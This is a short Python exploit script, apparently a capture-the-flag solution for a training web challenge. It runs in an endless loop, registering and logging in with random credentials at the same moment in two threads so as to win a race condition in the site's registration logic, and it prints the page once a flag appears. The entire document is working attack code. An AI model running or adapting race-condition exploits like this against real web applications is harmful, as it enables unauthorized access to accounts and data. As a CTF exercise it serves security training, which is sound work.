import string
import requests
import random
import threading
import time
import sys


baseurl = "http://meta.training.jinblack.it/"


def randomString(n=10):
    return ''.join(random.choice(string.ascii_lowercase) for _ in range(n))


def login(session, username, password):
    url = "%s/login.php" % baseurl
    url2 = "%s/index.php" % baseurl
    data = {"username": username, "password": password, "log_user": "1"}
    r = session.post(url, data=data)

    if 'Login Completed!' in r.text:
        r2 = s.get(url2)
        if 'flag' in r2.text:
            print(r2.text)
            sys.exit(0)


def register(session, username, password):
    url = "%s/register.php" % baseurl
    data = {"username": username, "password_1": password,
            "password_2": password, "reg_user": "1"}
    r = session.post(url, data=data)
    if "Registration Completed!" in r.text:
        return True
    else:
        return False


while True:
    s = requests.Session()  # Session object
    u = randomString()  # Random username
    p = randomString()  # Random password

    t1 = threading.Thread(target=register, args=(s, u, p))
    t2 = threading.Thread(target=login, args=(s, u, p))

    t1.start()
    t2.start()
    print(u, p)

    t1.join()
    t2.join()
    time.sleep(0.5)
